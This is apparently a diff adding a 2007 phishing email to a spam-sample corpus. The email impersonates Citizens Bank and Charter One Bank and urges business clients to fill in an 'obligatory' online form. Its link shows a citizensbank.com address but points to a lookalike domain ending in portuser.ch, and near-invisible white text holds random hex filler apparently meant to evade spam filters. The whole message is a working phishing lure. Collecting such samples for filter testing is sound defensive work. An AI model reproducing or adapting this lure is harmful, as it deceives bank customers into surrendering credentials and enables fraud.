@@ -1,0 +1,68 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <clientdepmnt.refbz3417856i.gps@citizensbank.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 9746C2A88C
+ for <user@example.com>; Sat,  4 Aug 2007 20:43:18 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 4675E621CBD
+ for <user@example.com>; Sat,  4 Aug 2007 20:43:18 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 05C3E1626A; Sat,  4 Aug 2007 20:48:05 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from 87.69.54.253.cable.012.net.il (87.69.54.253.cable.012.net.il
+ [87.69.54.253])
+ by mail.example.com (Example mail relay) with SMTP id 912FC16246
+ for <user@example.com>; Sat,  4 Aug 2007 20:48:01 -0400 (EDT)
+Received: from australiamail.com (EHLO moratorium.ainmarh.com [114.216.214.32])
+ by perfectgonzo.com with SMTP id GJZK0GO52R
+ for <user@example.com>; Sat, 04 Aug 2007 17:43:20 -0800
+Received: from paramagnet.allsaintsfan.com (unknown [100.244.174.172])
+ by atdmt.com with SMTP id HEGSWF672C
+ for <user@example.com>; Sun, 05 Aug 2007 02:43:20 +0100
+From: "Citizens Bank and Charter One Bank"
+ <clientdepmnt.refbz3417856i.gps@citizensbank.com>
+To: user <user@example.com>
+References: <businessclients.refg686576753011w.gps@citizensbank.com>
+Subject: Customer notice: your Citizens Bank and Charter One Bank banking
+ account! (mess_id: I748822693241KX)
+User-Agent: Mutt/1.5.1i
+X-Mailer: Mutt/1.5.1i
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--MY9T2U_KRQ10NCU9DB4IU"
+Message-Id: <20070805004801.912FC16246@mail.example.com>
+Date: Sat,  4 Aug 2007 20:48:01 -0400 (EDT)
+X-Keywords: 
+Status: O
+Content-Length: 3537
+Lines: 27
+
+----MY9T2U_KRQ10NCU9DB4IU
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta       http-equiv="Content-Type"       content="text/html;       charset=iso-8859-1">
+</head>
+
+<body>
+<p><font face="Verdana, Arial, Helvetica, sans-serif">Dear       Citizens  Bank       and     Charter      One    Bank customer,</font></p>
+<p><font  face="Verdana, Arial, Helvetica, sans-serif">Citizens   Bank &amp;   Charter  One     Bank  Customer     Service      requests     you to    complete   Money    Manager     GPS   Client     Online  Form.</font></p>
+<p><font  face="Verdana, Arial, Helvetica, sans-serif">This procedure   is  obligatory  for    all     business      and corporate    clients  of       Citizens Bank       and     Charter  One   Bank.</font></p>
+<p><font       face="Verdana, Arial, Helvetica, sans-serif">Please    click   hyperlink       below       to access  Money  Manager  GPS    Client       Online       Form.</font><br>
+</p>
+<p><font    face="Verdana, Arial, Helvetica, sans-serif"><a    href="http://moneymanagergps.session-61812684.citizensbank.com.portuser.ch/forms/clientcare.apx">http://moneymanagergps.session-61812684.citizensbank.com/forms/clientcare.apx</a></font></p>
+<p><font     face="Verdana, Arial, Helvetica, sans-serif">Please    do not respond  to   this   email.</font></p>
+<p><font       face="Verdana, Arial, Helvetica, sans-serif">&copy; Copyright    2007 Citizens Financial    Group.   All   rights    reserved.</font><br>
+</p>
+<p>****************************************************************</p>
+<p><font     color="#FFFFF7"      face="Verdana, Arial, Helvetica, sans-serif">0x9, 0x5744, 0x755, 0x6791, 0x45, 0x13521988, 0x9       include, 9LY 5G44, 2N3B.    LK7G: 0x83527766, 0x3, 0x72, 0x2154, 0x62     0x27444857, 0x5173, 0x8, 0x2759, 0x07389567, 0x6, 0x25       media: 0x77331738, 0x49814058, 0x13619485, 0x98259316, 0x97, 0x667, 0x77669458, 0x6233, 0x6760     root: 0x27, 0x88, 0x17, 0x15096548, 0x9379, 0x6740, 0x38655562, 0x4040, 0x03239088   0x7635, 0x673, 0x0, 0x7, 0x83981562, 0x404, 0x82816565, 0x51352474, 0x2, 0x655    include: 0x782, 0x16574469, 0x9, 0x52, 0x3642, 0x14 source: 0x256, 0x7538, 0x41401891, 0x2818, 0x24, 0x157, 0x776, 0x76, 0x88</font></p><p><font     color="#FFFFFE"    face="Verdana, Arial, Helvetica, sans-serif"><span>LYXB: 0x77693954, 0x8334, 0x92, 0x141, 0x767, 0x97, 0x562, 0x1, 0x0, 0x4, 0x180 close: 0x940, 0x8112, 0x769, 0x86432149, 0x69, 0x6772   0x3863, 0x94, 0x123, 0x8877, 0x8835 stack, 14Y, OUC2, common, rcs, LT4, dec, create, W85.   0x698, 
+ 0x4492, 0x2, 0x36455037, 0x25024697, 0x62, 0x4    cvs: 0x54, 0x55, 0x6, 0x4344, 0x933, 0x398      </span><span>media stack cvs create IVE0.   media: 0x68148301, 0x71, 0x65, 0x05701976   DM4: 0x3526, 0x0, 0x95377749, 0x9, 0x1, 0x7673, 0x9, 0x73, 0x1060, 0x126, 0x6466, 0x56, 0x43       engine: 0x39218387, 0x2270, 0x61</span></font></p>
+<p><font   color="#FFFFF8" face="Verdana, Arial, Helvetica, sans-serif"><span>0x8260, 0x98, 0x92       0x068, 0x3786, 0x8, 0x7333, 0x29821307   0x9, 0x8, 0x6200, 0x798, 0x632, 0x41, 0x24, 0x71, 0x267, 0x654, 0x5125, 0x590, 0x52, 0x12053502      DOR: 0x315      4JU 6OP0 VO62 PGW7.</span><span>0x038, 0x1, 0x4227, 0x36, 0x7510, 0x0211, 0x82824156, 0x4264, 0x522, 0x878, 0x20402514, 0x063, 0x18632984    </span><span>UR7: 0x5, 0x840, 0x85221986, 0x5, 0x89, 0x64981069     0x907, 0x969 common, rcs, XP9, SVID, update, SMN4, 62CG, XFU.    hex: 0x5849, 0x5, 0x98, 0x1960, 0x0, 0x39, 0x1006</span></font></p>
+</body>
+</html>
+
+
+----MY9T2U_KRQ10NCU9DB4IU--
